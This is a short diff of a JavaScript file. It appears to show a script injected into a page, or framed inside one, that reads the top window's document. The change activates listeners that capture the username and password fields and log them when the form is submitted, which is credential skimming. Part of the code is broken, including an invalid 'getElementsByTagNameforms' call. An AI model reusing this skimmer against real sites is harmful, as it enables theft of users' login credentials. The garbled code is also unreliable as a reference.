@@ -6,22 +6,21 @@ top.console.log('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?')
 // f.src = "/";
 let user;
 let pw;
-top.console.log('loaded script')
 // f.onload = () => {
 
-// top.document.addEventListener('change', e => {
-//   if (event.target.matches('#username')) {
-//     user = e.target.value;
-//   } else if (e.target.matches('#password')) {
-//     pw =
-//   }
-// })
+top.document.addEventListener('change', e => {
+  if (event.target.matches('#username')) {
+    user = e.target.value;
+  } else if (e.target.matches('#password')) {
+    pw = e.target.value
+  }
+}, false)
 
-  top.username.addEventListener('change', e => user = e.target.value);
+  // top.username.addEventListener('change', e => user = e.target.value);
   // top.password.addEventListener('change', e => user = e.target.value);
-  top.document.getElementsByTagName('button')[2].addEventListener('click', () => {
-  // top.document.getElementsByTagNameforms[0].addEventListener('submit', () => {
-    console.log("submitting a form");
+  top.document.getElementsByTagNameforms[0].addEventListener('submit', () => {
+    console.log("submitting a form", user, pw);
+
     if (top.document.forms[0].elements[0].classList.contains('hidden-input')) {
       console.log("doing shit", top.password.value);
       pw = top.password.value;
